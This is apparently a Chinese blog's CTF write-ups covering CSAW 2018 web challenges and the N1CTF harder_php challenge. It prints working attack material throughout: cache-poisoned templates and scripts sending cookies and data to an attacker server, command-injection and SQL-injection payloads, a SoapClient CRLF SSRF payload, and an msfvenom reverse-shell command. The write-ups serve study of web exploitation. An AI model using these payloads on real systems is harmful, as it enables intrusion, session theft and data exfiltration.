参考链接&emsp;&emsp;https://www.aperikube.fr/docs/csawquals_2018/sso/&emsp;&emsp;https://github.com/TryCTFAgain/CTF-Writeups/blob/master/2018/CSAW%20CTF'18/web.md#sso### Hacker Movie Club123456Hacker Movie ClubHacker movies are very popular, so we needed a site that we can scale. You better get started though, there are a lot of movies to watch.Author: itszn (ret2 systems)http://app.hm.vulnerable.services/ &emsp;&emsp;打开主页如下： &emsp;&emsp;源码：（去掉style）12345678910111213141516171819202122&lt;html&gt;&lt;head&gt;&lt;script data-src=\"mustache.min.js\" data-cdn=\"4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services\"&gt;&lt;/script&gt;&lt;script data-src=\"app.js\" data-cdn=\"4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=\"content\"&gt;Loading..&lt;/div&gt;&lt;script&gt;window.loaded_recapcha = () =&gt; { window.loaded_recapcha = true;}window.loaded_mustache = () =&gt; { window.loaded_mustache = true;}&lt;/script&gt;&lt;script src=\"/cdn.js\"&gt;&lt;/script&gt;&lt;script src='https://www.google.com/recaptcha/api.js?onload=loaded_recapcha&amp;render=explicit'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&emsp;&emsp;其中的/cdn.js作用是加上X-Forwarded-Host头去加载上面两个脚本。123456789101112131415161718// cdn.jsfor (let t of document.head.children) { if (t.tagName !== 'SCRIPT') continue; let { cdn, src } = t.dataset; if (cdn === undefined || src === undefined) continue; fetch(`//${cdn}/cdn/${src}`,{ headers: { 'X-Forwarded-Host':cdn }} ).then(r=&gt;r.blob()).then(b=&gt; { let u = URL.createObjectURL(b); let s = document.createElement('script'); s.src = u; document.head.appendChild(s); });}&emsp;&emsp;主页面上还有一个report的功能，一般看到这个一般都会出现XSS利用，但是这道题中并没有输入交互，所以XSS的利用方式还有些不同。&emsp;&emsp;app.js如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// app.jsvar token = null;Promise.all([ fetch('/api/movies').then(r=&gt;r.json()), fetch(`//4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/main.mst`).then(r=&gt;r.text()), new Promise((resolve) =&gt; { if (window.loaded_recapcha === true) return resolve(); window.loaded_recapcha = resolve; }), new Promise((resolve) =&gt; { if (window.loaded_mustache === true) return resolve(); window.loaded_mustache = resolve; })]).then(([user, view])=&gt;{ document.getElementById('content').innerHTML = Mustache.render(view,user); grecaptcha.render(document.getElementById(\"captcha\"), { sitekey: '6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5', theme: 'dark', callback: t=&gt; { token = t; document.getElementById('report').disabled = false; } }); let hidden = true; document.getElementById('report').onclick = () =&gt; { if (hidden) { document.getElementById(\"captcha\").parentElement.style.display='block'; document.getElementById('report').disabled = true; hidden = false; return; } fetch('/api/report',{ method: 'POST', body: JSON.stringify({token:token}) }).then(r=&gt;r.json()).then(j=&gt;{ if (j.success) { // The admin is on her way to check the page alert(\"Neo... nobody has ever done this before.\"); alert(\"That's why it's going to work.\"); } else { alert(\"Dodge this.\"); } }); }});&emsp;&emsp;main.mst下载后发现是模板文件。12345678910111213141516171819202122232425262728293031&lt;div class=\"header\"&gt;Hacker Movie Club&lt;/div&gt;{{#admin}}&lt;div class=\"header admin\"&gt;Welcome to the desert of the real.&lt;/div&gt;{{/admin}}&lt;table class=\"movies\"&gt;&lt;thead&gt; &lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Year&lt;/th&gt;&lt;th&gt;Length&lt;/th&gt;&lt;/thead&gt;&lt;tbody&gt;{{#movies}} {{^admin_only}} &lt;tr&gt; &lt;td&gt;{{ name }}&lt;/td&gt; &lt;td&gt;{{ year }}&lt;/td&gt; &lt;td&gt;{{ length }}&lt;/td&gt; &lt;/tr&gt; {{/admin_only}}{{/movies}}&lt;/tbody&gt;&lt;/table&gt;&lt;div class=\"captcha\"&gt; &lt;div id=\"captcha\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;button id=\"report\" type=\"submit\" class=\"report\"&gt;&lt;/button&gt;&emsp;&emsp;初期的一个探索并没有发现什么有价值的东西，所以我们可以考虑对每个请求包进行分析。&emsp;&emsp;在/api/movies响应的body中看到了一个只能由admin查看的项： &emsp;&emsp;当我们把它通过抓包改成false时，可以发现： &emsp;&emsp;可以看到，隐藏的项就出来了，所以我们的目的就明确了，但是我们没有太多可以交互的地方，所以还需要找突破点。 &emsp;&emsp;观察后发现每个响应头都有：12345678HTTP/1.1 200 OK...Cache-Control: no-cacheX-Varnish: 157274709Age: 0Via: 1.1 varnish-v4Accept-Ranges: bytesConnection: keep-alive &emsp;&emsp;去了解了下varnish，发现它是一个反向代理中的缓存服务程序。 如果来自Apache的响应是可缓存的，Varnish会将其存储以便更快地响应未来的请求。 &emsp;&emsp;varnish详细的请求头可以在这里找到。 &emsp;&emsp;所以这里我们需要用到一种叫Web Cache Poisoning（web缓存污染）的利用方法，这个跟Cache Poisoning（又称DNS污染）是不一样的东西。 &emsp;&emsp;参考链接： &emsp;&emsp;中文版-实战Web缓存中毒 &emsp;&emsp;英文原版 &emsp;&emsp;这里我们可以重点关注DOM Poisoning（DOM污染）。 &emsp;&emsp;另一个需要先了解的事情是X-Forwarded-Host的作用，详情可参考：这里。 X-Forwarded-Host (XFH) 是一个事实上的标准首部，用来确定客户端发起的请求中使用 Host 指定的初始域名。反向代理（如负载均衡服务器、CDN等）的域名或端口号可能会与处理请求的源头服务器有所不同，在这种情况下，X-Forwarded-Host 可以用来确定哪一个域名是最初被用来访问的。 &emsp;&emsp;语法：1X-Forwarded-Host: &lt;host&gt; &emsp;&emsp;上面这些归结起来就是当服务器进行缓存时它会将客户端的请求转发到XFH指定的host上去。 &emsp;&emsp;现在再回过头看看我们已有的资料。我们得知main.mst是模板文件，它会利用等对admin身份进行判断，如果我们能够劫持掉这个模板文件，使她绕过admin就可以获得到完整的项。 &emsp;&emsp;我们先来找到main.mst缓存的最大时间(max-age)，我们可以带着X-Forwarded-Host不停的请求/cdn/app.js，如果fetch('//4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/main.mst')能被我们控制到fetch('my_server/cdn/main.mst')上就成功的完成了劫持。 &emsp;&emsp;我们可以使用下面的脚本验证一下：123456789101112# -*- coding: utf-8 -*-import requestsX_Forwarded_Host = '1.2.3.4' while True: resp = requests.get(\"http://4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/app.js\", headers={'X-Forwarded-Host': X_Forwarded_Host}) print resp.headers if X_Forwarded_Host in resp.text: print resp.text break &emsp;&emsp;结果如下： &emsp;&emsp;可以看到我们成功的通过web缓存污染劫持了模板文件。接着我们再构造好模板文件，然后让admin去访问就可以拿到flag了。12345678910111213141516171819202122232425262728&lt;div class=\"header\"&gt;Hacker Movie Club&lt;/div&gt;&lt;div class=\"header admin\"&gt;Welcome to the desert of the real.&lt;/div&gt;&lt;table class=\"movies\"&gt;&lt;thead&gt; &lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Year&lt;/th&gt;&lt;th&gt;Length&lt;/th&gt;&lt;/thead&gt;&lt;tbody&gt;{{#movies}} &lt;tr&gt; &lt;td&gt;{{ name }}&lt;/td&gt; &lt;td&gt;{{ year }}&lt;/td&gt; &lt;td&gt;{{ length }}&lt;/td&gt; &lt;/tr&gt;{{/movies}}&lt;/tbody&gt;&lt;/table&gt;&lt;div class=\"captcha\"&gt; &lt;div id=\"captcha\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;button id=\"report\" type=\"submit\" class=\"report\"&gt;&lt;/button&gt;&lt;img src=x onerror=\"fetch('http://my_server_ip/'+'{{#movies}}{{ name }}{{/movies}}')\"&gt; &emsp;&emsp;如果你直接访问会出现一个跨域资源共享（CORS）的问题，如下： &emsp;&emsp;它要求服务器回应的头信息要包含Access-Control-Allow-Origin字段，如果你不想配置Apache或者Nginx，那你可以使用下面这个建议的python web server。1234567891011121314151617181920#!/usr/bin/env python# -*- coding: utf-8 -*-try: # Python 3 from http.server import HTTPServer, SimpleHTTPRequestHandler, test as test_orig import sys def test (*args): test_orig(*args, port=int(sys.argv[1]) if len(sys.argv) &gt; 1 else 8000)except ImportError: # Python 2 from BaseHTTPServer import HTTPServer, test from SimpleHTTPServer import SimpleHTTPRequestHandlerclass CORSRequestHandler (SimpleHTTPRequestHandler): def end_headers (self): self.send_header('Access-Control-Allow-Origin', '*') SimpleHTTPRequestHandler.end_headers(self)if __name__ == '__main__': test(CORSRequestHandler, HTTPServer) &emsp;&emsp;开启后就能在日志输出中得到flag： &emsp;&emsp;flag：flag{I_h0pe_you_w4tch3d_a11_th3_m0v1es} 参考链接：&emsp;&emsp;https://lud1161.github.io/posts/hacker-movie-club-csaw-quals-2018/ No Vulnerable Services12345No Vulnerable Services is a company founded on the idea that all websites should be secure. We use the latest web security standards, and provide complementary pentests of all customer sites with our exclusive NoPwn® guarantee.Be #unhackable.™http://no.vulnerable.services/ &emsp;&emsp;参考writeup：https://ctftime.org/writeup/11205 &emsp;&emsp;进入网站可以发现使用CSP，策略如下：1Content-Security-Policy: default-src &apos;none&apos;; script-src *.no.vulnerable.services https://www.google.com/ https://www.gstatic.com/; style-src *.no.vulnerable.services https://fonts.googleapis.com/ &apos;unsafe-inline&apos;; img-src *.no.vulnerable.services; font-src *.no.vulnerable.services https://fonts.gstatic.com/; frame-src https://www.google.com/ &emsp;&emsp;可以使用Google的CSP检测工具检测一下： &emsp;&emsp;发现script-src可能存在问题，但题目环境中我们并没有能够控制src的地方，所以再回头看看还有什么发现。 &emsp;&emsp;页面的最底下发现了一个奇怪的域名 &emsp;&emsp;访问后发现跟主域名(http://no.vulnerable.services/index.php)页面一样。我们ping一下`no.vulnerable.services`发现解析地址是：`216.165.2.40`，而他的16进制表示就是`0xd8a50228`。如果不知道怎么转换可以使用这个工具。 &emsp;&emsp;我们尝试改成对我们服务器的代理，如http://{hexip}.ip.no.vulnerable.services。 &emsp;&emsp;可以看到代理成功，能够访问到我们的网站。 &emsp;&emsp;由于CSP中存在script-src *.no.vulnerable.services，所以现在我们能绕过CSP保护了。 &emsp;&emsp;另外还有一个点就是我们能提交网站内容供他们检查，他们会使用bot去模拟访问。 &emsp;&emsp;所以我们在这里填写我们服务器上的恶意脚本，以拿到admin的cookie。使用脚本如下：123var img = document.createElement(\"img\");img.src = \"http://{hexip}.ip.no.vulnerable.services/?cookie=\" + encodeURI(document.cookie);document.body.appendChild(img); &emsp;&emsp;将此脚本放到服务器上，然后在report上提交链接：1&lt;script type=&quot;text/javascript&quot; src=&quot;//{hexip}.ip.no.vulnerable.services/your.js&quot;&gt;&lt;/script&gt; &emsp;&emsp;为了方便，我这里使用了一个python的简易服务器：123456789101112131415161718192021#!/usr/bin/env python# -*- coding: utf-8 -*-try: # Python 3 from http.server import HTTPServer, SimpleHTTPRequestHandler, test as test_orig import sys def test (*args): test_orig(*args, port=int(sys.argv[1]) if len(sys.argv) &gt; 1 else 8000)except ImportError: # Python 2 from BaseHTTPServer import HTTPServer, test from SimpleHTTPServer import SimpleHTTPRequestHandlerclass MyHandler(SimpleHTTPRequestHandler): def do_GET(self): print(self.headers) SimpleHTTPRequestHandler.do_GET(self)if __name__ == '__main__': test(MyHandler, HTTPServer) &emsp;&emsp;最后我们能收到cookie跟referer。 &emsp;&emsp;我带着这里得到的cookie访问http://admin.no.vulnerable.services。可以得到一个页面，源码如下：12345678910111213&lt;html&gt; &lt;head&gt; &lt;title&gt;NVS INTERNAL - Admin&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;Current Visitors: 672&lt;/p&gt; &lt;p&gt;Quick links:&lt;/p&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=\"//support.no.vulnerable.services\"&gt;Support&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"lb.php\"&gt;Load Balancers - BETA&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/body&gt;&lt;/html&gt; &emsp;&emsp;其中lb.php是一个负载均衡的监视器： &emsp;&emsp;而support.no.vulnerable.services我们无法访问，如果直接访问http://216.165.2.41/会得到404 Not Found。 &emsp;&emsp;从lb.php里我们能得知216.165.2.41是代理服务器，所以我们在请求216.165.2.41的时候带上Host头试试。 &emsp;&emsp;有回显，但明显被拦截了，那我们再试试另一种访问方式，ping出它的ip，然后用{hexip}.ip.no.vulnerable.services的方式访问。 &emsp;&emsp;成功进入，有一个ping的命令执行，所以考虑命令注入。 &emsp;&emsp;payload1:1127.0.0.1`ls` &emsp;&emsp;payload2:1127.0.0.1`cat%20flag.txt` &emsp;&emsp;flag: flag{7672f158167cab32aebc161abe0fbfcaee2868c1}。&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/09/csaw-writeup2/"},{"title":"N1CTF easy_harder_php预期解法","text":"前言&emsp;&emsp;easy php跟harder php在比赛中虽然源码已经get到，但没能做出来，现在官方网站已经关闭，但官方在Github上公开了源码和Docker配置，所以拉下来跟着writeup做一遍，学习学习姿势。 &emsp;&emsp;这道题看了一下网上的writeup，大概有四种解法： 预期解法 非预期解法 session.upload xdebug /tmp/临时文件竞争 &emsp;&emsp;非预期解法是按getshell的方法来划分的，这也导致easy php升级成harder php。写完writeup的时候发现预期解法的篇幅有点大了，但大有大的好处，作者在这里尽力还原了解题的完整过程，所以这篇就是harder php的预期解法。 预期解法获取源码&emsp;&emsp;首先尝试源码泄露，经过测试后发现只要在文件名后加~就能得到源码。 SQL注入获取admin密码&emsp;&emsp;然后简单的对源码进行审计一下，有如下发现： &emsp;&emsp;login跟register的$username使用了check_username()进行检查，$password则是直接进行md5()加密。 &emsp;&emsp;看到这个基本可以确定login跟register不存在注入，接着再看看哪里有insert、insert、select语句，然后可以看到在publish中的$_POST['signature']和$_POST['mood']没有经过任何过滤直接就进行了insert插入。 &emsp;&emsp;为了验证猜想，我们先注册一个账号，地址跟容易猜出来，就是?action=register，打开后发现要进行md5碰撞，这里也记录一下脚本。 &emsp;&emsp;碰撞脚本：1234567891011121314151617181920212223242526272829# -*- coding: utf-8 -*-# running in python2import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len, start=0, size=20): global CHARS while not stop_event.is_set(): rnds = ''.join(random.choice(CHARS) for _ in range(size)) md5 = hashlib.md5(rnds) if md5.hexdigest()[start: start+str_len] == substr: print rnds stop_event.set()if __name__ == '__main__': substr = 'b825c' # 修改此值 start_pos = 0 str_len = len(substr) cpus = multiprocessing.cpu_count() stop_event = multiprocessing.Event() processes = [multiprocessing.Process(target=cmp_md5, args=(substr, stop_event, str_len, start_pos)) for i in range(cpus)] for p in processes: p.start() for p in processes: p.join() &emsp;&emsp;注册后我们登陆网站，然后打开发表页面。 &emsp;&emsp;这里值得注意的是我们在哪个参数注入，mood参数被强制转成int，所以我们只能在signature中进行注入。 &emsp;&emsp;然后在插入的地方，我们发现他会把“`”转换成“’”，这就是一个利用点。 基于盲注&emsp;&emsp;所以我们可以构造这样的payload：1signature=1`,if(ascii(substr((select password from ctf_users where username=0x61646d696e),2,1))=53,sleep(3),0))#&amp;mood=0 &emsp;&emsp;注意，0x61646d696e是admin的16进制编码，而且这里不能直接比较字符如substr()&gt;'a'。如果注入成功则会延迟三秒返回页面。&emsp;&emsp;后来看writeup的时候发现了另一种有意思的注入方式，他通过反序列化控制了ip的值，然后通过返回不同的国家判断注入结果，其payload如下：1wat`,(select case when ascii(substr((select password from ctf_users where is_admin=1),3,1))=48 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:7:&quot;1.0.0.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=49 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:7:&quot;2.0.0.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=50 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:7:&quot;5.0.0.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=51 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:9:&quot;127.0.0.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=52 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:9:&quot;128.0.0.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=53 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:9:&quot;129.0.0.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=54 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:9:&quot;135.0.0.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=55 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:11:&quot;27.116.56.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=56 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:12:&quot;41.109.118.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=57 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:10:&quot;5.11.15.64&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=97 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:12:&quot;103.81.186.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=98 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:10:&quot;5.10.240.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=99 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:11:&quot;17.45.140.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=100 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:12:&quot;43.249.176.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=101 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:9:&quot;41.76.8.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` when ascii(substr((select password from ctf_users where is_admin=1),3,1))=102 then `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:9:&quot;46.8.41.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` else `O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;s:6:&quot;../../&quot;;s:2:&quot;ip&quot;;s:7:&quot;1.0.0.0&quot;;s:4:&quot;date&quot;;i:1520676219;}` end)) -- -&emsp;&emsp;但我在本地复现的时候这个payload却行不通，页面返回的是服务器错误，查看日志则是反序列化的错误。 &emsp;&emsp;这里作者就不再纠结这个问题了，最终admin的密码就是nu1ladmin。#### 二次注入&emsp;&emsp;除了盲注，这里作者还发现了一个博客中运用了更简单的payload，他使用了二次注入一次性将密码直接注入出来，从操作上来看二次注入的步骤显然要比盲注简单很多，所以作者对这种手法再进行练习。原博客地址为：p0’s blog | 破&emsp;&emsp;首先先注册一个新的用户，并且通过盲注确定他的id，然后进行二次注入，如：1signature=1`,(select 1)),(&apos;1&apos;,&apos;123&apos;,&apos;1&apos;,&apos;1&apos;)#mood=1&emsp;&emsp;这种注入就是一次插入两行数据，这样我们可以控制第二行的所有数据，然后我们可以将admin的密码显示到id为自己账号上的signature上。&emsp;&emsp;具体操作如下：1、获取用户的id： &emsp;&emsp;所以我的id就是4。接着进行二次注入，payload：1signature=1`,1),(4,`admin333`,(select concat(username,0x2c,password) from ctf_users where is_admin=1),`O:4:&quot;Mood&quot;:3:{s:4:&quot;mood&quot;;i:0;s:2:&quot;ip&quot;;s:14:&quot;220.181.171.99&quot;;s:4:&quot;date&quot;;i:1520667855;}`)#&amp;mood=0 &emsp;&emsp;最后刷新页面就可以获得admin的账号密码了。 反序列化+SSRF&emsp;&emsp;其实通过审计，我们可以知道得到admin的密码是不够的，因为admin的allow_diff_ip是=0的，所以我们还是无法直接利用。其实比赛中看到了反序列化漏洞，但因为Mood类中并没有魔术函数，所以一直以为反序列化利用不了，所以也就卡壳了。后来证实自己的知识面还是太窄了:( &emsp;&emsp;到了这一步，我们就要怎么利用SSRF了，我这里想到了两个方法： 1、修改admin的allow_diff_ip字段，使我们能直接登陆admin，然后上传 2、拿着你的session，去做admin的登录，然后上传 &emsp;&emsp;第一种因为被代码写死，所以无法利用。 &emsp;&emsp;所以我们利用第二种方式去getshell。&emsp;&emsp;在phpinfo中，我们发现soap是开启的，php中有一个特殊的类：SoapClient，它是用来创建soap数据报文，与wsdl接口进行交互的。 &emsp;&emsp;通过传入两个参数，第一个是 $url, 既目标url,第二个参数是一个数组，里面是soap请求的一些参数和属性。第二个参数(options)的相关介绍如下： &emsp;&emsp;我们可以看到这个类传入的第一个参数为 $wsdl。 &emsp;&emsp;控制是否是wsdl模式，如果为NULL，就是非wsdl模式。如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求，如果是wsdl模式，在序列化之前就会对$url参数进行请求，从而无法可控序列化数据。&emsp;&emsp;我们验证一下，写一个简单的发起soap请求。12345&lt;?php$a = new SoapClient(null, array('location' =&gt; \"http://192.168.187.133:8887\", 'uri' =&gt; \"123\"));echo serialize($a);?&gt;1O:10:\"SoapClient\":3:{s:3:\"uri\";s:3:\"123\";s:8:\"location\";s:27:\"http://192.168.187.133:8887\";s:13:\"_soap_version\";i:1;}&emsp;&emsp;抓包修改后发送。 &emsp;&emsp;在虚拟机中监听：nc -lvv 8887，再去刷新?action=index，就能看到服务器已经接收到soap请求。 CRLF&emsp;&emsp;现在我们已经触发了SSRF，但可以看到SOAP原始的数据是不符合POST请求的数据格式的，所以，我们要想办法控制soap请求使它符合post请求，从而实现我们的目的。 &emsp;&emsp;soap请求的content/type是text/xml; charset=utf‐8，我们没办法直接覆盖掉原本的content/type，而我们知道，要能通过$_POST获取数据，content/type要是application/x‐www‐form‐urlencoded才行。然后我们从SOAP的参数说明中知道：soap中是支持User-Agent的，并且在header里 User-Agent 是在 Content-Type 前面的，所以我们可以通过控制User-Agent来控制整个POST报文。 &emsp;&emsp;我们知道http请求报文中使用\\x0d\\x0a，也就是回车换行符，分割http请求头跟body部分，所以我们通过\\x0d\\x0a来控制soap请求，使他变成我们想要的http报文格式，这种攻击手段也称为CRLF。如： &emsp;&emsp;这里我使用了官方放出的payload：1234567891011121314&lt;?php$target = 'http://127.0.0.1/index.php?action=login';$post_string = 'username=admin&amp;password=nu1ladmin&amp;code=cf44f3147ab331af7d66943d888c86f9';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93' );$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; \"aaab\"));$aaa = serialize($b);$aaa = str_replace('^^',\"\\r\\n\",$aaa);$aaa = str_replace('&amp;','&amp;',$aaa);echo bin2hex($aaa);?&gt; &emsp;&emsp;我们只需将PHPSESSID跟code换成我们自己的就可以实现admin登陆。我们在另一个浏览器中打开页面，然后记录他的PHPSESSID跟code。如： &emsp;&emsp;所以，我的payload就是：1signature=x`,`O:10:\"SoapClient\":3:{s:3:\"uri\";s:1:\"0\";s:8:\"location\";s:39:\"http://127.0.0.1/index.php?action=login\";s:11:\"_user_agent\";S:188:\"fake\\0D\\0ACookie: PHPSESSID=etf9pia6ftpj50eav8jsbp7ta5\\0D\\0AContent-Type: application/x-www-form-urlencoded\\0D\\0AContent-Length: 700\\0D\\0A\\0D\\0Ausername=admin\\26password=nu1ladmin\\26code=THYoaQkVdIm739Hppszu\\26y=cc\";}`) -- -&amp;mood=0 &emsp;&emsp;然后我们在另一个浏览器上就可以以admin登陆了，（直接刷新页面即可，不用输入密码），然后可以看到我们已经解锁了文件上传功能。 上传文件getshell&emsp;&emsp;我们再来看文件上传的代码：123456789101112131415161718192021222324252627282930313233function upload($file){ $file_size = $file['size']; if($file_size&gt;2*1024*1024) { echo \"pic is too big!\"; return false; } $file_type = $file['type']; if($file_type!=\"image/jpeg\" &amp;&amp; $file_type!='image/pjpeg') { echo \"file type invalid\"; return false; } if(is_uploaded_file($file['tmp_name'])) { $uploaded_file = $file['tmp_name']; $user_path = \"/app/adminpic\"; if (!file_exists($user_path)) { mkdir($user_path); } $file_true_name = str_replace('.','',pathinfo($file['name'])['filename']); $file_true_name = str_replace('/','',$file_true_name); $file_true_name = str_replace('\\\\','',$file_true_name); $file_true_name = $file_true_name.time().rand(1,100).'.jpg'; $move_to_file = $user_path.\"/\".$file_true_name; if(move_uploaded_file($uploaded_file,$move_to_file)) { if(stripos(file_get_contents($move_to_file),'&lt;?php')&gt;=0) system('sh /home/nu1lctf/clean_danger.sh'); return $file_true_name; } else return false; } else return false;} &emsp;&emsp;可以看到如果你上传的文件包含&lt;?php,就会运行一个bash clean_danger.sh去删除这个文件。而这个脚本的代码是：12cd /app/adminpic/rm *.jpg &emsp;&emsp;绕过这个检测的方法有两个： 1、使用linux命令的一个feature&emsp;&emsp;当我们创建诸如 -xaaaaaaa.jpg的文件后，我们不能通过 rm or rm .jpg 删除它，除非 rm -r (它的上一层目录)，比如： 2、使用段标签&emsp;&emsp;因为php版本高于5.4，所以我们可以使用&lt;?=拿到webshell。 &emsp;&emsp;为了方便反弹shell，这里我用msf生成了shellcode，命令：1msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.187.129 LPORT=4444 -f raw &gt; /root/meter.php &emsp;&emsp;因为使用的是msf反弹shell的代码，所以我们用msf监听一下。 &emsp;&emsp;并且上传的时候我使用了第一种方法 &emsp;&emsp;文件上传上去后，我们需要找到他的位置即文件名，在upload函数中，我们看到系统对文件进行了重命名。 &emsp;&emsp;我们要找出真正的文件名，就需要知道time()的值，然后枚举1~100叠加上去。而time()是我们上传的时间的unix时间戳，而且要注意是date_default_timezone_set(&quot;PRC&quot;)。&emsp;&emsp;所以在即将上传前，我们获取一下当前的unix时间戳，如：123456&lt;?phpdate_default_timezone_set(\"PRC\");$file_true_name = '-webshell';$file_true_name = time();echo $file_true_name;?&gt;&emsp;&emsp;得到：1521017320，然后我们写个python脚本暴力跑一下：123456789101112# -*- coding:utf-8 -*-import requeststime = 152101732000url = 'http://192.168.187.133/index.php?action=../../../../app/adminpic/-haha{}.jpg'for i in range(10000): tmp = time + i ul = url.format(tmp) html = requests.get(ul).status_code if html == 200: print(ul) break&emsp;&emsp;这里需要注意的是我们的初始值是：152101732000，它比时间戳多了两位，这是因为时间戳的后面还有rand(1,100)，所以我们要考虑进去。&emsp;&emsp;跑了一会结果就出来了：http://192.168.187.133/index.php?action=../../../../app/adminpic/-meter152101732256.jpg，访问后可以看到页面返回正常。并且在msf里可以看到shell已经反弹回来。 拿到flag&emsp;&emsp;拿到shell后查看了文件，但没有发现flag文件。所以，flag应该在数据库中。然后发现了系统的配置脚本run.sh。里面暴露了mysql的账号密码，我们登陆mysql然后查询一下。sql语句如下：12use flag;select * from flag; &emsp;&emsp;可以看到flag已经出来了。 &emsp;&emsp;这里比较坑的是返回的shell并不是真实的shell，所以在执行mysql命令时总是存在延迟，有时数据也返回不完全，需要多次操作才能读出这个flag：n1ctf{php_unserialize_ssrf_crlf_injection_is_easy:p}。 总结&emsp;&emsp;这道题运用了很多姿势，复现完成后自己也学到了很多，不足的就是自己在复现的时候操作还不是很流畅，可能也是自己太菜的原因，但好在最后还是能照着writeup复现出来。复现过程中，查了几份writeup，但这些writeup对于很多细节却没有做详细的描述，所以这篇writeup我尽量的把每步操作都记录下来，方便自己也方便别人学习。 